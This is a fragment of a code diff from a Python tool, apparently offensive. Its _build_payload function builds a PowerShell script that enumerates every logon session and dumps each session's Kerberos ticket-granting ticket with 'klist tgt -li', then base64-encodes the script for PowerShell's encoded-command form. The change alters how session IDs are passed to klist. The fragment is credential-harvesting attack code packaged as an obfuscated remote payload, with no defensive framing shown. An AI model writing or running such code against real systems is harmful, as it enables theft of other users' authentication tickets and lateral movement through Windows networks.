@@ -316,8 +316,7 @@ def _build_payload(remote_out: str) -> tuple:
         "| ForEach-Object { $_.Matches[0].Groups[1].Value } | Sort-Object -Unique; "
         "foreach ($id in $luid) { "
         "  Write-Output ('=== SESSION ' + $id + ' ==='); "
-        "  $n = [int32][uint32]([convert]::ToUInt32($id.Substring(2),16)); "
-        "  klist tgt -li $n "
+        "  klist tgt -li $id "
         "}"
     )
     ps_b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
